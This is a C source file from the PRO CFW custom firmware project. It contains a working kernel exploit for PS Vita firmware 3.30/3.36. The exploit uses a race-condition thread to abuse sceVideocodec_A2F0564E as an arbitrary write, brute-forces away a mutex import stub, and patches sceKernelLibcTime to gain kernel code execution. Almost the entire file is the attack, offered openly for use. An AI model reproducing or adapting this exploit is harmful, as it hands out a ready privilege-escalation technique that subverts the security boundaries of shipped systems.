/*
 * This file is part of PRO CFW.

 * PRO CFW is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * PRO CFW is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with PRO CFW. If not, see <http://www.gnu.org/licenses/ .
 */

#include <sdk.h>
#include <psploadexec.h>
#include <psploadexec_kernel.h>
#include <psputility_modules.h>
#include <pspthreadman.h>
#include <module2.h>
#include <lflash0.h>
#include <rebootconfig.h>
#include <systemctrl_se.h>
#include <string.h>
#include "kxploit.h"
#include "functions.h"
#include "macros.h"

// argument buffer typedef
typedef struct
{
	u32 unk1;
	u32 unk2;
	u32 result;
	u32 pointer1;
	u32 pointer2;
	u32 unk3[6];
	u32 pointer3;
	u32 unk4[3];
	u32 alwaysone;
	u32 unk5[9];
} __attribute__((packed)) ArgumentBuffer;

// exploit function prototypes
int (* _sceVideocodec_A2F0564E)(ArgumentBuffer * arguments, int unknown) = (void *)NULL;
int (* _sceKernelLibcTime)(u32 structaddr, u32 kernelfunction) = (void *)NULL;

// regular function prototypes
int (* __sceKernelExitThread)(int status) = (void *)NULL;

// sceVideocodec sceKernelCreateMutex import stub
u32 sceVideoCodecCreateMutexImportStubOffset = 0x88139780;

// sceKernelLibcTime patch offset
u32 sceKernelLibcTimePatchOffset = 0x8800F9C4;

// _sceVideocodec_A2F0564E bruteforce poke offset shift
u32 firstStageOffsetShift = 0x24;

// poke address
u32 pokeAddress = 0;

// kernel patched flag
int kernelpatched = 0;

// thread shutdown trigger
int threadRequired = 1;

// argument buffer
ArgumentBuffer arguments;

void executeKernel(u32 kernelContentFunction)
{
	// execute patched sceKernelLibcTime function
	 g_tbl->KernelLibcTime(KERNELIFY(kernelContentFunction));
}

void repairInstruction(void)
{
	// Vita 3.30/3.36 : fix sceKernelLibcTime
	_sw(0x3C038801, sceKernelLibcTimePatchOffset);
	_sw(0x8C654644, sceKernelLibcTimePatchOffset + 4);
}

int stubScanner()
{

	// load required modules
	g_tbl->UtilityLoadModule(PSP_MODULE_AV_AVCODEC);
	g_tbl->UtilityLoadModule(PSP_MODULE_AV_MPEGBASE);
	
	// find poke function
	_sceVideocodec_A2F0564E = (void *)g_tbl->FindImportUserRam("sceVideocodec", 0xA2F0564E);
	
	// recast kernel execution function for multiple arguments
	_sceKernelLibcTime = (void *)g_tbl->KernelLibcTime;
	
	// find thread exit function
	__sceKernelExitThread = g_tbl->KernelExitThread; //(void *)g_tbl->FindImportUserRam("ThreadManForUser", 0xAA73C935);

	return 0;
}

int thidMain()
{
	// the cannonfire has to go on
	while(threadRequired == 1)
	{
		// share timeslice (so that the watchdog doesn't bite)
		g_tbl->KernelDelayThread(1);
		
		// trigger race condition
		arguments.pointer3 = pokeAddress;
	}
	
	// exit thread
	return __sceKernelExitThread(0);
}

void patchLibcTime()
{
	// find functions
	int (* _sceKernelCreateMutex)(char * name, int unk1, int unk2, int unk3) = (void *)FindFunction("sceThreadManager", "ThreadManForUser", 0xB7D098C6);
	int (* _sceKernelDcacheWritebackInvalidateAll)() = (void *)FindFunction("sceSystemMemoryManager", "UtilsForUser", 0xB435DEC5);
	int (* _sceKernelIcacheInvalidateAll)() = (void *)FindFunction("sceSystemMemoryManager", "UtilsForUser", 0x920F104A);

	// create the mutex this function would have created (if it worked properly)
	_sceKernelCreateMutex("SceKermitMe", 0x100, 0, 0);

	// restore the function pointer that we nuked in the first bruteforced poke
	_sw((u32)_sceKernelCreateMutex, sceVideoCodecCreateMutexImportStubOffset);
	
	// patch sceKernelLibcTime to allow for easy kernel function execution without bruteforcing
	_sw(0x00800008, sceKernelLibcTimePatchOffset);
	_sw(0, sceKernelLibcTimePatchOffset + 4);
	
	// flush dcache
	_sceKernelDcacheWritebackInvalidateAll();
	
	// flush icache
	_sceKernelIcacheInvalidateAll();
	
	// notify user thread that we're done
	kernelpatched = 1;
}

int doExploit()
{
	// set sceVideocodec mutex creation import stub poke address (for background thread)
	pokeAddress = sceVideoCodecCreateMutexImportStubOffset - firstStageOffsetShift;
	
	// start cannonfire thread
	int thid = g_tbl->KernelCreateThread("thid", thidMain, 8, 0x200, 0x80000000, 0);
	int thidStart = g_tbl->KernelStartThread(thid, 0, 0);
	
	// initialize argument buffer
	memset(&arguments, 0, sizeof(arguments));
	
	// no idea what this is
	arguments.unk1 = 0x05100601;
	
	// bruteforce the sceVideocodec library until we destroyed the mutex creation import
	while (arguments.result != 0x800201C3) // which causes a mutex not found error, aka. 0x800201C3
	{
		// reset arguments
		arguments.result = 0;
		arguments.pointer1 = 0x09000000;
		arguments.pointer2 = 0x09000000;
		arguments.pointer3 = 0x09000000;
		arguments.alwaysone = 1;
		
		// bruteforce mutex creation out of sceVideocodec library
		_sceVideocodec_A2F0564E(&arguments, 0);
	}
	
	// set libctime poke address (for background thread)
	pokeAddress = sceKernelLibcTimePatchOffset - firstStageOffsetShift;
	
	// repeat until kernel got patched
	while (kernelpatched != 1)
	{
		// reset arguments
		arguments.pointer1 = 0x09000000;
		arguments.pointer2 = 0x09000000;
		arguments.pointer3 = 0x09000000;
		arguments.alwaysone = 1;
		
		// attempt libctime poke (while background thread cannonfires the arguments)
		_sceVideocodec_A2F0564E(&arguments, 0);
	
		// invalidate cache
		g_tbl->KernelDcacheWritebackAll();
		
		// execute libctime patch
		_sceKernelLibcTime(0x08800000, KERNELIFY(patchLibcTime));
	}
	
	// shutdown thread
	threadRequired = 0;
	
	return 0;
}
